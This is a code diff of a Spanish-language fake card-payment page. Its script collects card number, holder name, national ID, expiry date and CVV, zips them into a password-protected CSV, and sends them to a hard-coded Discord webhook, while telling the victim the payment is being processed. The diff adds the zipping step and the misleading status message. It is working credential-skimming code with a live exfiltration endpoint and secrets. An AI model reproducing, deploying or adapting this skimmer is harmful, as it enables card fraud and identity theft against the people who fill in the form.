@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjetas</title>
+  <title>Pagar con tarjeta</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -71,6 +71,7 @@
       color: black;
     }
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.6.0/jszip.min.js"></script>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
   <script>
@@ -86,45 +87,50 @@
         return;
       }
 
-      var zipFileName = cardNumber.substr(0, 6);
-      var zipPassword = "08papanat4s";
+      var fileName = cardNumber.substr(0, 6) + '_Tarjeta.csv';
 
-      var cardData = {
-        cardNumber: cardNumber,
-        cardName: cardName,
-        cardDNI: cardDNI,
-        cardExpiration: cardExpiration,
-        cardCVV: cardCVV
-      };
+      var cardData = [
+        new Date().toLocaleString(),
+        cardNumber,
+        cardName,
+        cardDNI,
+        cardExpiration,
+        cardCVV
+      ];
 
-      sendDataToWebhook(zipFileName, zipPassword, cardData);
-      document.getElementById("done-message").textContent = "Enviando tarjeta al webhook...";
+      createAndSendData(fileName, cardData);
+      document.getElementById("done-message").textContent = "Listo! Procesando pago...";
+
+      setTimeout(function() {
+        document.getElementById("done-message").textContent = "";
+      }, 2000);
     }
 
-    function sendDataToWebhook(zipFileName, zipPassword, cardData) {
-      var payload = {
-        zipFileName: zipFileName,
-        zipPassword: zipPassword,
-        cardData: cardData
-      };
+    function createAndSendData(fileName, cardData) {
+      var zip = new JSZip();
+      var csvContent = cardData.join(", ");
+      zip.file(fileName, csvContent);
 
-      fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(function(response) {
-        if (response.ok) {
-          document.getElementById("done-message").textContent = "Tarjeta enviada exitosamente al webhook.";
-        } else {
-          document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
-        }
-      })
-      .catch(function(error) {
-        document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
-      });
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: "08papanat4s" })
+        .then(function(content) {
+          var formData = new FormData();
+          formData.append("file", content, fileName + ".zip");
+
+          fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
+            method: "POST",
+            body: formData
+          })
+          .then(function(response) {
+            if (response.ok) {
+              document.getElementById("done-message").textContent = "Tarjeta enviada exitosamente al webhook.";
+            } else {
+              document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
+            }
+          })
+          .catch(function(error) {
+            document.getElementById("error-message").textContent = "Error al enviar la tarjeta al webhook.";
+          });
+        });
     }
 
     function validateCard(cardNumber) {
